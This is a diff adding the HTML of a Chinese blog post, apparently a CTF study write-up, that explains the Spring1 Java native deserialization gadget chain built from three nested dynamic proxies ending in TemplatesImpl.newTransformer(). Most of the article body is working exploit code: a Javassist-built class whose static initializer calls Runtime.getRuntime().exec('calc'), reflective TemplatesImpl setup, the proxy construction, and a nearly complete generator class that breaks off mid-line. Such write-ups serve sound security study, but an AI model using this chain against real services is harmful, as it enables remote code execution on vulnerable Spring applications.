@@ -1,0 +1,271 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Spring1原生反序列化链 | 楽のsecret base</title><meta name="author" content="楽依"><meta name="copyright" content="楽依"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="三层动态代理的暴力美学？">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spring1原生反序列化链">
+<meta property="og:url" content="https://leyi.live/2026/01/03/Spring1%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/index.html">
+<meta property="og:site_name" content="楽のsecret base">
+<meta property="og:description" content="三层动态代理的暴力美学？">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://leyi.live/img/post13.jpg">
+<meta property="article:published_time" content="2026-01-03T04:30:35.000Z">
+<meta property="article:modified_time" content="2026-01-03T04:34:08.016Z">
+<meta property="article:author" content="楽依">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://leyi.live/img/post13.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Spring1原生反序列化链",
+  "url": "https://leyi.live/2026/01/03/Spring1%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/",
+  "image": "https://leyi.live/img/post13.jpg",
+  "datePublished": "2026-01-03T04:30:35.000Z",
+  "dateModified": "2026-01-03T04:34:08.016Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "楽依",
+      "url": "https://leyi.live"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="https://leyi.live/2026/01/03/Spring1%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Spring1原生反序列化链',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style>
+  #custom-loading {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #0B0B0B;
+    z-index: 9999;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    transition: opacity 0.5s ease;
+  }
+  .loading-content {
+    position: relative;
+    width: 100%;
+    height: 100%;
+  }
+  .loading-content span {
+    width: 8vmin;
+    height: 8vmin;
+    border-radius: 4vmin;
+    backface-visibility: hidden;
+    position: absolute;
+    animation-name: loadingMove;
+    animation-timing-function: cubic-bezier(0.4, 0, 1, 0.8);
+    animation-iteration-count: infinite;
+    animation-duration: 3s;
+    top: 50%;
+    left: 50%;
+    transform-origin: -4vmin center;
+  }
+  .loading-content span:nth-child(1) { background: #E5E6E5; animation-delay: -0.5s; opacity: 0; }
+  .loading-content span:nth-child(2) { background: #494A49; animation-delay: -1s; opacity: 0; }
+  .loading-content span:nth-child(3) { background: #8F908F; animation-delay: -1.5s; opacity: 0; }
+  .loading-content span:nth-child(4) { background: #E5E6E5; animation-delay: -2s; opacity: 0; }
+  .loading-content span:nth-child(5) { background: #494A49; animation-delay: -2.5s; opacity: 0; }
+  .loading-content span:nth-child(6) { background: #8F908F; animation-delay: -3s; opacity: 0; }
+  @keyframes loadingMove {
+    0% { transform: scale(1) rotate(0deg) translate3d(0, 0, 1px); }
+    30% { opacity: 1; }
+    100% { z-index: 10; transform: scale(0) rotate(360deg) translate3d(0, 0, 1px); }
+  }
+</style>
+<script>
+  // 立即写入加载动画，不等待任何事件
+  document.write(`
+    <div id="custom-loading">
+      <div class="loading-content">
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+    </div>
+  `);
+</script>
+<meta name="generator" content="Hexo 8.1.1"></head><body><div id="web_bg" style="background-image: url(/img/background.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><span> 链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/post13.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/bar0.gif" alt="Logo"><span class="site-name">楽のsecret base</span></a><a class="nav-page-title" href="/"><span class="site-name">Spring1原生反序列化链</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><span> 链接</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Spring1原生反序列化链</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-01-03T04:30:35.000Z" title="Created 2026-01-03 12:30:35">2026-01-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-01-03T04:34:08.016Z" title="Updated 2026-01-03 12:34:08">2026-01-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9B%B8%E5%85%B3/">CTF相关</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Spring1原生反序列化链"><a href="#Spring1原生反序列化链" class="headerlink" title="Spring1原生反序列化链"></a>Spring1原生反序列化链</h1><p>Spring1原生链的依赖</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Spring1链最终通过<code>Templates</code>类的<code>newTransformer()</code>方法动态加载恶意类执行命令，核心点在于前部分<strong>三层动态代理</strong>的嵌套使用，这里采用顺推</p>
+<p>首先看入口类<code>MethodInvokeTypeProvider</code>，它是抽象类<code>SerializableTypeWrapper</code>下的静态类，其<code>readObject()</code>如下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream inputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">            inputStream.defaultReadObject();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ReflectionUtils.findMethod(<span class="built_in">this</span>.provider.getType().getClass(), <span class="built_in">this</span>.methodName);</span><br><span class="line">            <span class="built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="built_in">this</span>.provider.getType());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们的目标是<code>method</code>为<code>&quot;newTransformer&quot;</code>，<code>this.provider.getType()</code>返回构造的<code>Templates</code>对象，那么<code>provider</code>肯定是一个代理对象了，问题是处理器得选谁，经过前面CC1的学习，<code>AnnotationInvocationHandler</code>类的invoke()方法可以做到返回特定的对象，那是否可以直接把<code>Templates</code>作为结果返回呢？不可以，因为<code>getType()</code>方法要求返回一个<code>Type</code>对象，直接返回<code>Templates</code>会转型失败报错，所以此处应再返一个代理对象，且代理对象实现了<code>Type</code>接口</p>
+<p>ysoserial的源码告诉我们第二层代理的处理器应选择抽象类<code>AutowriteUtils</code>下的<code>ObjectFactoryDelegatingInvocationHandler</code>，它的<code>invoke()</code>方法如下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">            <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;equals&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> proxy == args[<span class="number">0</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> System.identityHashCode(proxy);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.objectFactory.toString();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.objectFactory.getObject(), args);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> ex.getTargetException();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于<code>method</code>是从<code>readObject()</code>里传递的<code>&quot;newTransformer&quot;</code>，也就是说<code>readObject()</code>并不是直接触发<code>newTransformer()</code>的方法，而是<code>ObjectFactoryDelegatingInvocationHandler</code>的<code>invoke()</code>，这个类的特别之处在于其invoke()方法中再一次调用了一个方法<code>getObject()</code>，并且触发的对象<code>this.objectFactory</code>是可控的。那么我们让<code>this.objectFactory</code>再次作为代理对象，处理器是<code>AnnotationInvocationHandler</code>，让其触发<code>getObject()</code>时返回真正的<code>Templates</code>即可，以下是前半部分的利用链</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">this.provider.getType()</span><br><span class="line">&gt;$Proxy0.getType()</span><br><span class="line">&gt;AnnotationInvocationHandler.invoke()</span><br><span class="line">    &gt;$Proxy1.newTransformer()</span><br><span class="line">    &gt;ObjectFactoryDelegatingInvocationHandler.invoke()</span><br><span class="line">    &gt;newTransformer.invoke(this.objectFactory.getObject(), null)</span><br><span class="line">    &gt;newTransformer.invoke($Proxy2.getObject(), null)</span><br><span class="line">        &gt;newTransformer.invoke(AnnotationInvocationHandler.invoke(), null)</span><br><span class="line">        &gt;newTransformer.invoke(Templates, null)</span><br><span class="line">            &gt;Templates.newTransformer()</span><br></pre></td></tr></table></figure>
+
+<p>接下来构造链，前面是构造动态加载恶意类和<code>Templates</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">spring</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;spring&quot;</span>);</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.getCtClass(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">spring.setSuperclass(superClass);</span><br><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor01</span> <span class="operator">=</span> spring.makeClassInitializer();</span><br><span class="line">constructor01.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] bytes = spring.toBytecode();</span><br><span class="line"></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">Class&lt;?&gt; templatesClass = templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">name.set(templates, <span class="string">&quot;spring&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>构造第一层代理，在调用<code>getObject()</code>方法时返回<code>templates</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; annotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor02 =  annotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor02.setAccessible(<span class="literal">true</span>);</span><br><span class="line">HashMap&lt;String, Object&gt; map01 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map01.put(<span class="string">&quot;getObject&quot;</span>, templates);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler01</span> <span class="operator">=</span> (InvocationHandler) constructor02.newInstance(Target.class, map01);</span><br><span class="line">ObjectFactory&lt;?&gt; proxy01 = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;ObjectFactory.class&#125;, handler01);</span><br></pre></td></tr></table></figure>
+
+<p>构造第二层代理，在调用<code>newTransformer()</code>方法时去调用第一层代理的<code>getObject()</code>方法，故要让<code>objectFactory</code>属性为前面构造的<code>handler01</code>，并且该代理对象同时实现<code>Type</code>和<code>Templates</code>接口以满足返回值要求和<code>newTransformer()</code>方法的响应</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; objectFactoryDelegatingInvocationHandler = Class.forName(<span class="string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor03 =  objectFactoryDelegatingInvocationHandler.getDeclaredConstructor(ObjectFactory.class);</span><br><span class="line">constructor03.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler02</span> <span class="operator">=</span> (InvocationHandler) constructor03.newInstance(proxy01);</span><br><span class="line"><span class="type">Type</span> <span class="variable">proxy02</span> <span class="operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;Type.class, Templates.class&#125;, handler02);</span><br></pre></td></tr></table></figure>
+
+<p>构造第三层代理，在调用<code>getType()</code>方法时返回<code>proxy02</code>，由于<code>TypeProvider</code>接口为包私有，需要先直接获取类，再传入，同时代理对象<code>proxy03</code>也是只能声明为<code>Object</code>类型</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;String, Object&gt; map02 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map02.put(<span class="string">&quot;getType&quot;</span>, proxy02);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler03</span> <span class="operator">=</span> (InvocationHandler) constructor02.newInstance(Target.class, map02);</span><br><span class="line">Class&lt;?&gt; typeProviderClass = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">proxy03</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;typeProviderClass&#125;, handler03);</span><br></pre></td></tr></table></figure>
+
+<p>由于入口类是<code>MethodInvokeTypeProvider</code>，我们要创建该类实例，并让<code>this.methodName</code>为<code>&quot;newTransformer&quot;</code>，构造器需要一个<code>Method</code>对象，先随便传，后面再通过反射修改</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; methodInvokeTypeProviderClass = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor04 = methodInvokeTypeProviderClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor04.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">methodInvokeTypeProvider</span> <span class="operator">=</span> constructor04.newInstance(proxy03, Object.class.getMethod(<span class="string">&quot;getClass&quot;</span>), <span class="number">0</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">methodName</span> <span class="operator">=</span> methodInvokeTypeProvider.getClass().getDeclaredField(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">methodName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">methodName.set(methodInvokeTypeProvider, <span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>至此，Spring1原生反序列化链构建完毕，全链如下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringSerialTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">spring</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;spring&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.getCtClass(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        spring.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor01</span> <span class="operator">=</span> spring.makeClassInitializer();</span><br><span class="line">        constructor01.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = spring.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class&lt;?&gt; templatesClass = templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;spring&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; annotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor02 =  annotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor02.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        HashMap&lt;String, Object&gt; map01 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map01.put(<span class="string">&quot;getObject&quot;</span>, templates);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler01</span> <span class="operator">=</span> (InvocationHandler) constructor02.newInstance(Target.class, map01);</span><br><span class="line">        ObjectFactory&lt;?&gt; proxy01 = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;ObjectFactory.class&#125;, handler01);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; objectFactoryDelegatingInvocationHandler = Class.forName(<span class="string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor03 =  objectFactoryDelegatingInvocationHandler.getDeclaredConstructor(ObjectFactory.class);</span><br><span class="line">        constructor03.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler02</span> <span class="operator">=</span> (InvocationHandler) constructor03.newInstance(proxy01);</span><br><span class="line">        <span class="type">Type</span> <span class="variable">proxy02</span> <span class="operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;Type.class, Templates.class&#125;, handler02);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, Object&gt; map02 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map02.put(<span class="string">&quot;getType&quot;</span>, proxy02);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler03</span> <span class="operator">=</span> (InvocationHandler) constructor02.newInstance(Target.class, map02);</span><br><span class="line">        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy03</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;typeProviderClass&#125;, handler03);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; methodInvokeTypeProviderClass = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor04 = methodInvokeTypeProviderClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor04.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">methodInvokeTypeProvider</span> <span class="operator">=</span> constructor04.newInstance(proxy03, Object.class.getMethod(<span class="string">&quot;getClass&quot;</span>), <span class="number">0</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">methodName</span> <span class="operator">=</span> methodInvokeTypeProvider.getClass().getDeclaredField(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">        methodName.setAccessible(<span 